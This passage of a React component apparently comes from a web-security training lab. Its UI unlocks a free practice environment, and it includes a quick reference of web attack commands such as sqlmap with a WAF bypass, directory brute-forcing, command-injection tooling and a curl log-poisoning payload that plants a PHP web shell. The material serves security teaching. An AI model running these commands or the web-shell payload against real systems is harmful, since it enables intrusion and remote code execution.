            {guidedDone && <div style={{ position: 'absolute', top: 0, left: 0, right: 0, height: '2px', background: 'linear-gradient(90deg, transparent, ' + accent + ', transparent)' }} />}
            <div style={{ fontSize: '7px', color: guidedDone ? '#3a8a9a' : '#003a4a', letterSpacing: '0.3em', marginBottom: '1rem' }}>
              {guidedDone ? 'READY FOR COMPREHENSIVE TESTING' : 'COMPLETE GUIDED PHASE TO UNLOCK'}
            </div>
            <div style={{ fontFamily: 'JetBrains Mono, monospace', fontSize: '1.2rem', color: guidedDone ? accent : '#004a5a', fontWeight: 700, marginBottom: '0.5rem' }}>
              LAUNCH FULL LAB ENVIRONMENT
            </div>
            <div style={{ display: 'flex', gap: '12px', justifyContent: 'center', flexWrap: 'wrap', marginBottom: '2rem' }}>
              {['SQL injection', 'XSS', 'SSRF', 'LFI/RFI', 'JWT attacks', 'WAF bypass'].map(feat => (
                <div key={feat} style={{ display: 'flex', alignItems: 'center', gap: '5px' }}>
                  <div style={{ width: '4px', height: '4px', borderRadius: '50%', background: guidedDone ? accent : '#003a4a' }} />
                  <span style={{ fontFamily: 'JetBrains Mono, monospace', fontSize: '7.5px', color: guidedDone ? '#3a8a9a' : '#003a4a' }}>{feat}</span>
                </div>
              ))}
            </div>
            <button
              onClick={() => guidedDone && setFreeLaunched(true)}
              disabled={!guidedDone}
              style={{ fontFamily: 'JetBrains Mono, monospace', fontSize: '0.9rem', fontWeight: 700, letterSpacing: '0.15em', padding: '14px 40px', border: '1px solid ' + (guidedDone ? 'rgba(0,212,255,0.6)' : '#003a4a'), borderRadius: '6px', background: guidedDone ? 'rgba(0,212,255,0.12)' : 'transparent', color: guidedDone ? accent : '#004a5a', cursor: guidedDone ? 'pointer' : 'not-allowed', boxShadow: guidedDone ? '0 0 24px rgba(0,212,255,0.18)' : 'none', transition: 'all 0.2s' }}
            >
              {guidedDone ? '&#9658; LAUNCH FREE LAB ENVIRONMENT' : '&#128274; COMPLETE GUIDED PHASE FIRST'}
            </button>
            {!guidedDone && <div style={{ marginTop: '1rem', fontFamily: 'JetBrains Mono, monospace', fontSize: '7px', color: '#003a4a' }}>Complete all {steps.length} guided steps above to unlock the free lab environment</div>}
          </div>
        ) : (
          <div style={{ border: '1px solid ' + accent + '30', borderRadius: '10px', overflow: 'hidden', background: '#060809' }}>
            <FreeLabTerminal moduleId={moduleId} moduleName={moduleName} accent={accent} onClose={() => setFreeLaunched(false)} />
            <div style={{ padding: '8px 16px', background: '#080a0b', borderTop: '1px solid ' + accent + '15', display: 'flex', alignItems: 'center', gap: '8px' }}>
              <div style={{ width: '5px', height: '5px', borderRadius: '50%', background: accent, boxShadow: '0 0 5px ' + accent }} />
              <span style={{ fontFamily: 'JetBrains Mono, monospace', fontSize: '7.5px', color: '#2a6a7a' }}>
                You are in free practice mode. Ask <span style={{ color: accent }}>GHOST AGENT</span> (bottom-right) for hints on any web attack technique.
              </span>
            </div>
          </div>
        )}
      </div>

      {/* Quick reference */}
      <div style={{ marginBottom: '2rem' }}>
        <button onClick={() => setShowKeywords(!showKeywords)} style={{ background: 'transparent', border: '1px solid #003a4a', borderRadius: '5px', padding: '8px 16px', cursor: 'pointer', fontFamily: 'JetBrains Mono, monospace', fontSize: '7.5px', color: '#2a6a7a', letterSpacing: '0.1em', marginBottom: showKeywords ? '12px' : 0 }}>
          {showKeywords ? '&#9660;' : '&#9658;'} QUICK REFERENCE &#8212; WEB ATTACK COMMANDS
        </button>
        {showKeywords && (
          <div style={{ background: '#060809', border: '1px solid #002a3a', borderRadius: '6px', padding: '1.25rem', fontFamily: 'JetBrains Mono, monospace', fontSize: '0.75rem' }}>
            <div style={{ display: 'grid', gridTemplateColumns: 'repeat(auto-fill, minmax(340px, 1fr))', gap: '8px' }}>
              {[
                ['whatweb -a 3 http://target', 'Fingerprint web app stack'],
                ["sqlmap -u 'http://target?id=1' --dbs", 'Enumerate databases'],
                ["sqlmap -u 'url' --tamper=space2comment", 'SQLi with WAF bypass'],
                ['gobuster dir -u http://target -w common.txt', 'Directory brute-force'],
                ['wafw00f http://target', 'Identify WAF product'],
                ['nikto -h http://target', 'Web server misconfiguration scan'],
                ['tplmap -u "http://target?q=test"', 'SSTI auto-detection'],
                ['jwt_tool TOKEN -X a', 'JWT algorithm attack tests'],
                ['commix --url="http://target?host=TEST"', 'Command injection auto'],
                ['ffuf -u http://target/FUZZ -w wordlist.txt', 'Fast web fuzzing'],
                ["curl -d '<?php system($_GET[cmd]);?>' -A '' http://target", 'Log poisoning payload'],
                ['curl -I http://target | grep -i csp', 'Check Content-Security-Policy'],
              ].map(([cmd, desc]) => (
                <div key={cmd} style={{ display: 'flex', gap: '10px', alignItems: 'flex-start', padding: '6px 8px', background: '#04060a', borderRadius: '4px' }}>
                  <code style={{ color: accent, fontSize: '0.68rem', flexShrink: 0, whiteSpace: 'pre' }}>{cmd}</code>
                  <span style={{ color: '#3a8a9a', fontSize: '0.7rem' }}>{desc}</span>
                </div>
              ))}
            </div>
          </div>
        )}
      </div>

      {/* Footer nav */}
      <div style={{ paddingTop: '2rem', borderTop: '1px solid #002a3a', display: 'flex', justifyContent: 'space-between', alignItems: 'center', flexWrap: 'wrap', gap: '10px' }}>
        <Link href="/modules/web-attacks" style={{ textDecoration: 'none', fontFamily: 'JetBrains Mono, monospace', fontSize: '0.75rem', color: '#2a6a7a' }}>&#8592; BACK TO CONCEPT</Link>
        <Link href="/modules/malware/lab" style={{ textDecoration: 'none', fontFamily: 'JetBrains Mono, monospace', fontSize: '0.75rem', color: '#2a6a7a' }}>MOD-07 MALWARE ANALYSIS LAB &#8594;</Link>
      </div>
    </div>
  )
}
